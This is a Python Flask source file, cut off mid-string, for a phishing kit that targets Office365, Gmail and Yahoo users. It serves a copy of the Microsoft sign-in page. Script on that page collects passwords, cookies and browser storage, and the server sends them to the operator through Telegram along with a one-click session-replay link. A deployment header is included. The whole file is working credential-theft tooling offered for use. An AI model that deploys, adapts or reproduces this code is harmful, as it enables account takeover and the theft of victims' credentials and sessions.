
#!/usr/bin/env python3
"""
🔥 M365/GMAIL/OUTLOOK UNIVERSAL PHISHER w/ ONE-CLICK SESSION REPLAY
Deploy: Railway + Procfile(gunicorn app:app) + TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID
"""

import os
from flask import Flask, request, jsonify
import requests
import urllib.parse
import re
from datetime import datetime

app = Flask(__name__)

# 🔧 CONFIG (Railway ENV vars)
TELEGRAM_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')

# 🎯 PROVIDER COOKIE TARGETS
PROVIDER_CONFIG = {
    'office': {
        'name': '🔴 Office365/Outlook',
        'url': 'https://outlook.office.com/mail/inbox',
        'cookies': ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'MUID', 'MSID', 'x-ms-gateway-slice', 'cL', 'MSFPC']
    },
    'gmail': {
        'name': '🟢 Gmail', 
        'url': 'https://mail.google.com/mail/u/0/#inbox',
        'cookies': ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'GMAIL_AT', 'NID']
    },
    'yahoo': {
        'name': '🟡 Yahoo',
        'url': 'https://mail.yahoo.com',
        'cookies': ['T', 'Y', 'B']
    }
}

def send_telegram(msg):
    """Send to Telegram"""
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={
                    'chat_id': TELEGRAM_CHAT_ID,
                    'text': msg,
                    'parse_mode': 'HTML',
                    'disable_web_page_preview': True
                }
            )
        except:
            pass

def detect_provider(email, cookies_dict):
    """Auto-detect email provider"""
    email_lower = email.lower()
    
    # Office365/Outlook cookies
    if any(k in cookies_dict for k in PROVIDER_CONFIG['office']['cookies']):
        return 'office'
    
    # Gmail cookies  
    if any(k in cookies_dict for k in PROVIDER_CONFIG['gmail']['cookies']):
        return 'gmail'
    
    # Domain-based
    if any(domain in email_lower for domain in ['yahoo.com', 'ymail.com']):
        return 'yahoo'
    elif any(domain in email_lower for domain in ['outlook.com', 'hotmail.com', 'live.com']):
        return 'office'
    elif 'gmail.com' in email_lower:
        return 'gmail'
    
    return 'office'  # Default to Office

@app.route('/')
def index():
    """Phishing page (M365 replica - replace with your HTML)"""
    return """
<!DOCTYPE html>
<html>
<head><title>Microsoft Sign In</title></head>
<body style="background:#f0f0f0;font-family:Segoe UI">
<div style="max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1)">
    <img src="https://login.microsoftonline.com/common/images/logo.png" style="width:200px;margin-bottom:30px">
    <h2 style="color:#0078d4;margin-bottom:20px">Sign in to your account</h2>
    <form id="loginForm" style="width:100%">
        <input type="email" id="username" placeholder="Email or phone" 
               style="width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;margin-bottom:15px;box-sizing:border-box" required>
        <input type="password" id="password" placeholder="Password" 
               style="width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;margin-bottom:20px;box-sizing:border-box" required>
        <button type="submit" style="width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer">Sign in</button>
    </form>
    <script>
        document.getElementById('loginForm').onsubmit = async (e) => {{
            e.preventDefault();
            
            // 🎣 HARVEST EVERYTHING
            const harvest = {{
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                cookies: document.cookie,
                ua: navigator.userAgent,
                screen: `${{screen.width}}x${{screen.height}}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
                sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)))
            }};
            
            // 📤 SEND TO HARVEST
            await fetch('/harvest', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(harvest)
            }});
            
            // ⏳ 3.5s → LEGIT REDIRECT
            setTimeout(() => {{
                window.location.href = 'https://login.microsoftonline.com';
            }}, 3500);
        }};
    </script>
</body>
</html>
"""

@app.route('/harvest', methods=['POST'])
def harvest():
    """🎣 MAIN HARVEST ENDPOINT"""
    try:
        data = request.get_json() or {}
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        email = data.get('username', 'N/A')
        pwd = data.get('password', 'N/A')
        cookies_raw = data.get('cookies', '')
        
        # 🍪 PARSE COOKIES
        cookies_dict = {}
        for c in cookies_raw.split(';'):
            if '=' in c:
                name, value = c.strip().split('=', 1)
                cookies_dict[name] = value.strip()
        
        # 🔍 DETECT PROVIDER
        provider_key = detect_provider(email, cookies_dict)
        provider_config = PROVIDER_CONFIG[provider_key]
        
        # 🎯 EXTRACT CRITICAL COOKIES
        critical_cookies = {}
        for cookie_name in provider_config['cookies']:
            if cookie_name in cookies_dict:
                critical_cookies[cookie_name] = cookies_dict[cookie_name]
        
        # 📋 EXPORT STRING
        cookie_export = "; ".join([f"{k}={v}" for k,v in critical_cookies.items()])
        
        # 📊 STATS
        critical_count = len(critical_cookies)
        total_cookies = len(cookies_dict)
        
        # 🪵 CONSOLE LOG
        log_msg = f"🎣 [{datetime.now()}] {ip} | {email} | {provider_config['name']} | {critical_count}/{len(provider_config['cookies'])} cookies"
        print(log_msg)
        
        # 🚀 TELEGRAM MESSAGE w/ ONE-CLICK
        replay_url = f"https://{request.host}/replay?cookies={urllib.parse.quote(cookie_export)}&target={urllib.parse.quote(provider_config['url'])}"
        
        tmsg = f"""🔥 <b>📧 EMAIL SESSION CAPTURED!</b> {provider_config['name']}

👤 <code>{email}</code>
🔑 <code>{pwd}</code>

🍪 <b>CRITICAL COOKIES ({critical_count}/{len(provider_config['cookies'])}):</b>
